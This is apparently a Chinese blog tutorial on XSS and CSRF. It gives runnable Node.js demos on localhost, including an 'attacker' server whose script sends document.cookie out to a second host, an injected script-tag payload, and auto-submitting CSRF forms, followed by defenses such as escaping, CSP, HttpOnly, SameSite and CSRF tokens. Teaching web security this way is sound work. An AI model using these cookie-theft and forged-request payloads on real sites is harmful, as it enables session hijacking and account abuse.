# 浏览器安全基础

> 首发于：2020-10-27

## XSS 攻击

### 什么是 XSS 攻击

XSS 全称是 Cross Site Scripting，为了与“CSS”区分开来，故简称 XSS，翻译过来就是“跨站脚本”。XSS 攻击是指黑客往 HTML 文件中或者 DOM 中注入恶意脚本，从而在用户浏览页面时利用注入的恶意脚本对用户实施攻击的一种手段。

XSS 攻击会造成的几个典型的危害：

- 可以窃取 Cookie 信息。恶意 JavaScript 可以通过“document.cookie”获取 Cookie 信息，然后通过 XMLHttpRequest 或者 Fetch 加上 CORS 功能将数据发送给恶意服务器；恶意服务器拿到用户的 Cookie 信息之后，就可以在其他电脑上模拟用户的登录，然后进行转账等操作。
- 可以监听用户行为。恶意 JavaScript 可以使用“addEventListener”接口来监听键盘事件，比如可以获取用户输入的信用卡等信息，将其发送到恶意服务器。黑客掌握了这些信息之后，又可以做很多违法的事情。
- 可以通过修改 DOM 伪造假的登录窗口，用来欺骗用户输入用户名和密码等信息。
- 还可以在页面内生成浮窗广告，这些广告会严重地影响用户体验。

### XSS 的攻击方式

#### 存储型 XSS 攻击

存储型 XSS 攻击大致需要经过如下步骤：
1. 首先黑客利用站点漏洞将一段恶意 JavaScript 代码提交到网站的数据库中；
1. 然后用户向网站请求包含了恶意 JavaScript 脚本的页面；
1. 当用户浏览该页面的时候，恶意脚本就会将用户的 Cookie 信息等数据上传到服务器。

我用下面代码来模拟了一个这样的过程：

站点1 node.js 服务端代码 website1.js
```js
const http = require('http')
const fs = require('fs')
const querystring = require('querystring')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }
    if (request.url === '/postsomething' && request.method === 'POST') {
        // 接收 post 请求提交上来的数据并写入到 sometext.txt，模拟前端提交数据存入数据库的过程
        let post = ''
        request.on('data', chunk => {
            post += chunk
        })
        request.on('end', () => {    
            post = querystring.parse(post)
            fs.writeFileSync(__dirname + '/sometext.txt', post.sometext)
            respose.writeHead(200)
            respose.end('ok')
        })
        return  
    }
    const message = fs.readFileSync(__dirname + '/sometext.txt', 'utf-8')
    respose.setHeader('Set-Cookie', [`id=${new Date().getTime()};`, `type=test`])
    respose.writeHead(200)
    respose.end(`
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>WebsiteA</title>
    </head>
    <body>
        <p>从服务端获取的文本如下：</p>
        <div id="server-text">${message}</div>
        <form id='sometext' action="./postsomething" method="POST">
            <p>输入一些文字上传到服务器: <input type="text" name="sometext" /></p>
            <input type="submit" value="提交" />
        </form>
    </body>
    </html>
    `)
}).listen(3000)
```

同一目录下还有一个 sometext.txt 文件（在这里起的就是站点1的数据库的作用），默认写着如下文本
```
Hello, WebsiteA!
```

站点2，黑客的站点代码，node.js 服务，website2.js
```js
const http = require('http')
const fs = require('fs')
const url = require('url')
const querystring = require('querystring')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }
    respose.setHeader('Access-Control-Allow-Origin', '*')
    if (request.url.indexOf('/getsomething') > -1 && request.method === 'GET') {
        let urlObj = url.parse(request.url)
        let queryObj = querystring.parse(urlObj.query)
        fs.appendFileSync(__dirname + '/user_message.txt', queryObj.cookie + '\n')
        respose.writeHead(200)
        respose.end('ok')
        return  
    }
    respose.writeHead(200)
    respose.end(`
    const xmlhttp = new XMLHttpRequest();
    xmlhttp.open("GET","http://localhost:4000/getsomething?" + "cookie=" + document.cookie, true);
    xmlhttp.send();
    `)
}).listen(4000)
```

同一目录下还有一个 user_message.txt 文件（在这里起的就是站点2的数据库的作用），默认为空。

操作步骤：
- 首先，我们将 website1 和 website2 两个 web 服务跑起来，输入 [http://localhost:3000](http://localhost:3000) 打开站点1，我们会看到如下界面：
![](./image/pic1.awebp)

- 然后，我们可以尝试输入一些“正常”的字符，进行提交，提交成功会跳转到 [http://localhost:3000/postsomething](http://localhost:3000/postsomething) , 显示一个 ok，sometext.txt 里面的内容也会随之变化，如下图所示：
![](./image/pic2.awebp)
![](./image/pic3.awebp)
![](./image/pic4.awebp)

- 接下来，我们再回到 [http://localhost:3000](http://localhost:3000) 你可以看到，你刚才输入的内容出现在了界面上，如下图所示：
![](./image/pic5.awebp)

- 然后，我们来模拟一些黑客的操作，输入一些奇奇怪怪的脚本，比如：`<script type="text/javascript" src="http://localhost:4000"></script>`，我们用端口 4000 这个站点来模拟黑客搜集你数据的一个站点，当你点击提交之后，再回到站点1的时候，就会执行站点2里面设定的代码，他会把你的 cookie 信息发送到站点2的后台，可以看一下 user_message.txt 文件，这时候就应该有你的 cookie 信息了，如下图所示：
![](./image/pic6.awebp)
![](./image/pic7.awebp)
![](./image/pic25.awebp)
![](./image/pic8.awebp)
![](./image/pic9.awebp)

以上模拟了一个简单的存储型 XSS 攻击，黑客不仅可以通过这种手段获取到 cookie 信息，还能监听你的键盘等信息，从而盗取你的各种账户密码。

#### 反射型 XSS 攻击
在一个反射型 XSS 攻击过程中，恶意 JavaScript 脚本属于用户发送给网站请求中的一部分，随后网站又把恶意 JavaScript 脚本返回给用户。当恶意 JavaScript 脚本在用户页面中被执行时，黑客就可以利用该脚本做一些恶意操作。

另外需要注意的是，Web 服务器不会存储反射型 XSS 攻击的恶意脚本，这是和存储型 XSS 攻击不同的地方。我把上面代码改造了一下，模拟了一下反射型 XSS 攻击的例子。

- 站点3 node.js 服务 website3.js 代码

```js
const http = require('http')
const url = require('url')
const querystring = require('querystring')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }
    if (request.url.indexOf('getsomething') > -1 && request.method === 'GET') {
        let urlObj = url.parse(request.url)
        let queryObj = querystring.parse(urlObj.query)
        respose.writeHead(200)
        respose.end(`
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>Website3</title>
        </head>
        <body>
            <p>URL上的一些信息：</p>
            <div id="some-text">${queryObj.xss}</div>
        </body>
        </html>
        `)
        return  
    }
    respose.writeHead(200)
    respose.end('')
}).listen(3030)
```

- 先看看输入正常文本的例子，如下图所示：
![](./image/pic10.awebp)

- 再看一下输入恶意脚本的例子，如下图所示：
![](./image/pic11.awebp)

- 再看一下输入了恶意样式的例子，如下图所示：
![](./image/pic12.awebp)

#### 基于 DOM 的 XSS 攻击
基于 DOM 的 XSS 攻击是不牵涉到页面 Web 服务器的。具体来讲，黑客通过各种手段将恶意脚本注入用户的页面中，比如通过网络劫持在页面传输过程中修改 HTML 页面的内容，这种劫持类型很多，有通过 WiFi 路由器劫持的，有通过本地恶意软件来劫持的，它们的共同点是在 Web 资源传输过程或者在用户使用页面的过程中修改 Web 页面的数据。

### 如何阻止 XSS 攻击

#### 1、服务器对输入脚本进行过滤或转码
最普遍的做法就是转义输入输出的内容，对于引号，尖括号，斜杠进行转义，下面是一段转义代码：
```js
function escape(str) {
  str = str.replace(/&/g, '&amp;')
  str = str.replace(/</g, '&lt;')
  str = str.replace(/>/g, '&gt;')
  str = str.replace(/"/g, '&quto;')
  str = str.replace(/'/g, '&#39;')
  str = str.replace(/`/g, '&#96;')
  str = str.replace(/\//g, '&#x2F;')
  return str
}
```
上面的 `<script type="text/javascript" src="http://localhost:4000"></script>` 转义输出之后变成了 `&lt;script type=&quto;text&#x2F;javascript&quto; src=&quto;http:&#x2F;&#x2F;localhost:4000&quto;&gt;&lt;&#x2F;script&gt;`,这段字符串就无法被当成脚本执行了。

#### 2、充分利用 CSP
内容安全策略 (CSP) 是一个额外的安全层，用于检测并削弱某些特定类型的攻击，包括跨站脚本 (XSS) 和数据注入攻击等。无论是数据盗取、网站内容污染还是散发恶意软件，这些攻击都是主要的手段。

虽然在服务器端执行过滤或者转码可以阻止 XSS 攻击的发生，但完全依靠服务器端依然是不够的，我们还需要把 CSP 等策略充分地利用起来，以降低 XSS 攻击带来的风险和后果。

实施严格的 CSP 可以有效地防范 XSS 攻击，具体来讲 CSP 有如下几个功能：
- 限制加载其他域下的资源文件，这样即使黑客插入了一个 JavaScript 文件，这个 JavaScript 文件也是无法被加载的；
- 禁止向第三方域提交数据，这样用户数据也不会外泄；
- 禁止执行内联脚本和未授权的脚本；还提供了上报机制，这样可以帮助我们尽快发现有哪些 XSS 攻击，以便尽快修复问题。
因此，利用好 CSP 能够有效降低 XSS 攻击的概率。

下面是一个实例，我们修改一下上面的 website1.js 的代码, 在第27行加上如下代码：
```js
// 只允许加载本站资源
respose.setHeader('Content-Security-Policy', `default-src 'self'`)

// 只允许加载 HTTPS 协议图片
// respose.setHeader('Content-Security-Policy', `img-src https://*`)
// 允许加载任何来源框架
// respose.setHeader('Content-Security-Policy', `child-src 'none'`)
```
加入 CSP 策略之后再次打开站点1会发现 xss 请求被拦截了，所下图所示：
![](./image/pic13.awebp)
![](./image/pic14.awebp)

更多属性可以看这里 [https://content-security-policy.com/](https://content-security-policy.com/)

#### 3、使用 HttpOnly 属性
由于很多 XSS 攻击都是来盗用 Cookie 的，因此还可以通过使用 HttpOnly 属性来保护我们 Cookie 的安全。使用 HttpOnly 标记的 Cookie 只能使用在 HTTP 请求过程中，所以无法通过 JavaScript 来读取这段 Cookie，也就是说 `document.cookie` 失效了。
```js
// respose.setHeader('Set-Cookie', [`id=${new Date().getTime()};`, `type=test`])
// 修改为
respose.setHeader('Set-Cookie', [`id=${new Date().getTime()}; HttpOnly`, `type=test; HttpOnly`])
```
所以即使页面被注入了恶意 JavaScript 脚本，也是无法获取到设置了 HttpOnly 的数据。因此一些比较重要的数据我们建议设置 HttpOnly 标志。

## CSRF 攻击

### 什么是 CSRF 攻击

CSRF(也称 XSRF) 英文全称是 Cross-site request forgery，所以又称为“跨站请求伪造”，是指黑客引诱用户打开黑客的网站，在黑客的网站中，利用用户的登录状态发起的跨站请求。简单来讲，CSRF 攻击就是黑客利用了用户的登录状态，并通过第三方的站点来做一些坏事。和 XSS 不同的是，CSRF 攻击不需要将恶意代码注入用户的页面，仅仅是利用服务器的漏洞和用户的登录状态来实施攻击。

#### 1、自动发起 Get 请求

黑客最容易实施的攻击方式是自动发起 Get 请求，具体攻击方式你可以参考下面这几段代码：

node.js web 服务代码 websiteA.js

```js
const http = require('http')
const fs = require('fs')
const url = require('url')
const querystring = require('querystring')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }
    if (!request.headers.cookie) {
        respose.setHeader('Set-Cookie', [`id=${new Date().getTime()};`, `type=test`])
        respose.writeHead(200)
        respose.end(fs.readFileSync(__dirname + '/websiteA.html', 'utf-8'))
    } else {
        let urlObj = url.parse(request.url)
        let queryObj = querystring.parse(urlObj.query)
        respose.writeHead(200)
        respose.end('WebsiteA with cookie, from ' + queryObj.from)
        console.log('WebsiteA with cookie, from ' + queryObj.from)
    }    
}).listen(3000)
```

页面代码 websiteA.html

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebsiteA</title>
</head>
<body>
    WebSiteA without cookie!
</body>
</html>
```

node.js web 服务代码 websiteB.js

```js
const http = require('http')
const fs = require('fs')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }
    respose.writeHead(200)
    respose.end(fs.readFileSync(__dirname + '/websiteB.html', 'utf-8'))
}).listen(4000)
```

页面代码 websiteB.html

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WebsiteB</title>
</head>
<body>
    <h1>黑客的站点 WebsiteB：CSRF攻击演示</h1>
    <img src="http://localhost:3000/?from=websiteB">
</body>

</html>
```
操作步骤：
- 首先， 如果使用的是高版本的 Chrome，那么 SameSite 属性会默认为 Lax，为了能成功模拟问题，我们需要关闭掉这个选项。地址栏输入：[chrome://flags/](chrome://flags/) ，找到 SameSite by default cookies 和 Cookies without SameSite must be secure 设置为 Disable。

- 然后，你可以把两个 web 服务的代码运行起来，先去访问 [http://localhost:3000/?from=websiteA](http://localhost:3000/?from=websiteA) ，第一次访问站点A，肯定是没有 cookie 的，访问一次之后会被设置 cookie，有 cookie 和没有 cookie 访问到的界面内容是不一样的，第一次访问站点A界面如下图所示：
![](./image/pic15.awebp)

- 再然后我们再访问黑客站点B [http://192.168.31.39:4000](http://192.168.31.39:4000) （这是你本机的局域网地址，为了造成不同源的效果所以用这个地址，注：端口不一样在 SameSite 属性看来还是同源的），这时因为站点A的 cookie 已经设置了，所以站点B中链接会直接带着 cookie 的信息去访问站点A（这是浏览器的机制决定的），第一次访问站点B界面如下图所示：
![](./image/pic16.awebp)

- 再次访问站点A，界面如下图所示：
![](./image/pic17.awebp)

- 三次访问完成之后 node.js 控制台打印信息如下图所示：
![](./image/pic18.awebp)

- 以上就是黑客进行 CSRF 攻击的大致流程，例子里面我的请求和 cookie 的内容都很简单，实际中肯定要比这个更加复杂，cookie 很可能会带着我们的登录信息，这样在黑客的网站发起请求的时候服务端就会认为黑客也是合法登录的用户，他就可以为所欲为了。

#### 2、自动发起 POST 请求

除了自动发送 Get 请求之外，有些服务器的接口是使用 POST 方法的，所以黑客还需要在他的站点上伪造 POST 请求，当用户打开黑客的站点时，是自动提交 POST 请求，具体的方式你可以参考下面几段示例代码：

node.js web 服务代码 websiteC.js

```js
const http = require('http')
const querystring = require('querystring')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }   
    if (!request.headers.cookie) {
        respose.setHeader('Set-Cookie', [`id=${new Date().getTime()};`, `type=test`])        
        respose.writeHead(200)
        respose.end('Hello, websiteC!')
    } else {
        console.log('visit with cookie: ' + request.headers.cookie)
        if (request.url === '/postpage' && request.method === 'POST') {
            let post = ''
            request.on('data', chunk => {
                post += chunk
            })
            request.on('end', () => {    
                post = querystring.parse(post)
                respose.end(JSON.stringify(post))
            })
            return
        }
        respose.writeHead(200)
        respose.end('WebsiteC with cookie')
    }
}).listen(3030)
```
node.js web 服务代码 websiteD.js

```js
const http = require('http')
const fs = require('fs')

http.createServer((request, respose) => {
    if (request.url === '/favicon.ico') {
        respose.writeHead(200)
        respose.end('hello')
        return
    }
    respose.writeHead(200)
    respose.end(fs.readFileSync(__dirname + '/websiteD.html', 'utf-8'))
}).listen(4040)
```

页面代码 websiteD.html

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body>
    <h1>黑客的站点：CSRF攻击演示</h1>
    <form id='hacker-form' action="http://localhost:3030/postpage" method=POST>
        <input type="hidden" name="user" value="hacker" />
        <input type="hidden" name="number" value="100" />
    </form>
    <script> document.getElementById('hacker-form').submit(); </script>
</body>
</html>
```
操作步骤：
- 首先， 如果使用的是高版本的 Chrome，那么 SameSite 属性会默认为 Lax，为了能成功模拟问题，我们需要关闭掉这个选项。地址栏输入：[chrome://flags/](chrome://flags/) ，找到 SameSite by default cookies 和 Cookies without SameSite must be secure 设置为 Disable。

- 然后，你可以把两个 web 服务的代码运行起来，先去访问 [http://localhost:3030](http://localhost:3030) ，第一次访问站点C，肯定是没有 cookie 的，第一次访问站点C界面如下图所示：
![](./image/pic19.awebp)

- 再然后我们再访问黑客站点D [http://192.168.31.39:4040](http://192.168.31.39:4040) （这是你本机的局域网地址，为了造成不同源的效果所以用这个地址，注：端口不一样在 SameSite 属性看来还是同源的），这时因为站点C的 cookie 已经设置了，所以站点D中链接会直接带着 cookie 的信息去访问站点C（这是浏览器的机制决定的），然后里面会进行 form 提交，然后跳转到站点C去，第一次访问站点D界面如下图所示：
![](./image/pic20.awebp)

- 再次访问站点C，界面如下图所示：
![](./image/pic21.awebp)

- 三次访问完成之后 node.js 控制台打印信息如下图所示：
![](./image/pic22.awebp)

- 表单提交的场景在实际使用中还是比较多的，黑客可以轻易利用这些漏洞来假冒你去提交一些表单，这是非常危险的。

#### 3、引诱用户点击链接

除了自动发起 Get 和 Post 请求之外，还有一种方式是诱惑用户点击黑客站点上的链接，这种方式通常出现在论坛或者恶意邮件上。黑客会采用很多方式去诱惑用户点击链接，示例代码如下所示：

- 页面代码 websiteE.html
```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <div>
        <img width=150 src="https://ss0.bdstatic.com/70cFuHSh_Q1YnxGkpoWK1HF6hhy/it/u=3167766756,2295973976&fm=26&gp=0.jpg"> </img>
    </div>
    <div>
        <!-- 黑客很可能会在此处放一个恶意链接，比如：一个转账的接口 -->
        <a href="http://localhost:3000" taget="_blank"> 点击下载美女照片 </a>
    </div>
</body>
</html>
```

### 如何防止 CSRF 攻击

发起 CSRF 攻击的三个必要条件：
- 第一个，目标站点一定要有 CSRF 漏洞；
- 第二个，用户要登录过目标站点，并且在浏览器上保持有该站点的登录状态；
- 第三个，需要用户打开一个第三方站点，可以是黑客的站点，也可以是一些论坛。

#### 1、设置好 Cookie 的 SameSite 属性

SameSite 选项通常有 Strict、Lax 和 None 三个值。
- Strict 最为严格。如果 SameSite 的值是 Strict，那么浏览器会完全禁止第三方 Cookie。简言之，如果你从极客时间的页面中访问 InfoQ 的资源，而 InfoQ 的某些 Cookie 设置了 SameSite = Strict 的话，那么这些 Cookie 是不会被发送到 InfoQ 的服务器上的。只有你从 InfoQ 的站点去请求 InfoQ 的资源时，才会带上这些 Cookie。
- Lax 相对宽松一点。在跨站点的情况下，从第三方站点的链接打开和从第三方站点提交 Get 方式的表单这两种方式都会携带 Cookie。但如果在第三方站点中使用 Post 方法，或者通过 img、iframe 等标签加载的 URL，这些场景都不会携带 Cookie。
- None 的话，在任何情况下都会发送 Cookie 数据。

下面我们来修改一下前面“自动发起 Get 请求”的代码，将 websiteA.js 中的设置 cookie 的代码修改一下：

```js
respose.setHeader('Set-Cookie', [`id=${new Date().getTime()};`, `type=test`])
// 把上面这一段代码修改为下面代码
respose.setHeader('Set-Cookie', [`id=${new Date().getTime()}; SameSite=Strict`, `type=test; SameSite=Strict`])
```
清除掉原来的 cookie（这一步不能忽略），重复前面“自动发起 Get 请求”的步骤，你会发现，无论站点B怎么刷新怎么请求，都不会带着 站点A的 cookie 了，从下图也可以看出来， 设置了 SameSite=Strict 之后站点B里面的请求是有警告的。
![](./image/pic23.awebp)
![](./image/pic24.awebp)

#### 2、验证请求的来源站点
在服务器端验证请求来源的站点，我的 node.js web 服务器的代码可以验证一下 `request.headers.referer`，也能够判断出请求的来源是一个第三方的网站，从而对该请求进行拦截。

虽然可以通过 Referer 告诉服务器 HTTP 请求的来源，但是有一些场景是不适合将来源 URL 暴露给服务器的，因此浏览器提供给开发者一个选项，可以不用上传 Referer 值，具体可参考 Referrer Policy。但在服务器端验证请求头中的 Referer 并不是太可靠，因此标准委员会又制定了 Origin 属性，在一些重要的场合，比如通过 XMLHttpRequest、Fecth 发起跨站请求或者通过 Post 方法发送请求时，都会带上 Origin 属性。

Origin 属性只包含了域名信息，并没有包含具体的 URL 路径，这是 Origin 和 Referer 的一个主要区别。在这里需要补充一点，Origin 的值之所以不包含详细路径信息，是有些站点因为安全考虑，不想把源站点的详细路径暴露给服务器。因此，服务器的策略是优先判断 Origin，如果请求头中没有包含 Origin 属性，再根据实际情况判断是否使用 Referer 值。

#### 3、CSRF Token
第一步，在浏览器向服务器发起请求时，服务器生成一个 CSRF Token。CSRF Token 其实就是服务器生成的字符串，然后将该字符串植入到返回的页面中。你可以参考下面示例代码：
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <form action="https://xxx.xxx.xxxx/path" method="POST">
      <input type="hidden" name="csrf-token" value="nc98P987bcpncYhoadjoiydc9ajDlcn">
      <input type="text" name="user">
      <input type="text" name="number">
      <input type="submit">
    </form>
</body>
</html>
```

第二步，在浏览器端如果要发起请求，那么需要带上页面中的 CSRF Token，然后服务器会验证该 Token 是否合法。如果是从第三方站点发出的请求，那么将无法获取到 CSRF Token 的值，所以即使发出了请求，服务器也会因为 CSRF Token 不正确而拒绝请求。

## 参考资料
[前端进阶之道-安全](https://yuchengkai.cn/docs/frontend/safety.html)

[极客时间-浏览器工作原理与实践-33讲](https://time.geekbang.org/column/article/152807)

[极客时间-浏览器工作原理与实践-34讲](https://time.geekbang.org/column/article/154110)
